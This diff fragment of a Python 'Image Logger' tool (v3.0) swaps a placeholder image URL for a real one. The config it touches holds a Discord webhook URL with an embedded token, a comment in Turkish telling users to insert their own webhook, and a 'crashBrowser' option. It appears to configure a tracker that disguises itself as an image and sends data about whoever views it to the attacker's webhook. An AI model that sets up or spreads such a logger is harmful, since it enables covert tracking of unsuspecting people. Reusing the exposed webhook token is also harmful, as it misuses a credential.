@@ -13,7 +13,7 @@ __version__ = "v3.0"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1521879191165861930/lPotxlicbua1dIUOP_KLCU2ZD4J2fogj0o2flmwsmSwDzFQ0zf6-35JVGB4RS7aLnUy4",  # BURAYA KENDI WEBHOOKUNU YAZ
-    "image": "https://i.imgur.com/your_image.jpg",
+    "image": "https://i.pinimg.com/736x/39/ce/a7/39cea78e15b64b9f6dec3bc62b219951.jpg",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "crashBrowser": False,
